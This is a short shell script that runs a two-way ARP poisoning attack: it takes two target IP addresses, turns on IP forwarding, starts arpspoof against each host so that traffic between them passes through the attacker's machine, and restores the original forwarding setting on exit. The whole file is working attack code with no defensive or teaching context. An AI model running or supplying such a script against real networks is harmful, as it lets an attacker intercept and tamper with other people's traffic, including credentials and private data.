#!/bin/sh

if [ -z ${1+x} ] || [ -z ${2+x} ] || [ -z ${3+x} ]; then
	echo "Missing argument: <IP 1>, <IP 2>, <IP Forwarding>"
	exit 1
fi

CLEAN_WAIT=5

echo ""
ip_forward=$(cat /proc/sys/net/ipv4/ip_forward)
echo $3 > /proc/sys/net/ipv4/ip_forward

echo "Poisoning ARP tables!"
arpspoof -t $1 $2 &
arpspoof -t $2 $1 &
read

echo $ip_forward > /proc/sys/net/ipv4/ip_forward
killall arpspoof
sleep $CLEAN_WAIT # Wait for arpspoof clean-up
echo ""

exit 0
